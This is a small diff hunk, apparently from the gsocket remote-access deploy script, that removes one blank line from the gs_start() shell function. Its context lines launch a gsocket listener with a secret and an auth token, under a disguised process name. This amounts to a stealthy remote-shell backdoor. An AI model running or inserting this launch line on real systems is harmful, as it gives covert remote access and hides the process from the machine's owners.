@@ -1549,7 +1549,6 @@ gs_start()
 		# This does work:
 		#     FOO="X=1" && (eval $FOO id)
 		(cd "$HOME"; GSOCKET_AUTH=gobloklo TERM=xterm-256color GS_ARGS="-s $GS_SECRET -liD -A gobloklo" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN") || errexit
-
 		IS_GS_RUNNING=1
 	fi
 }
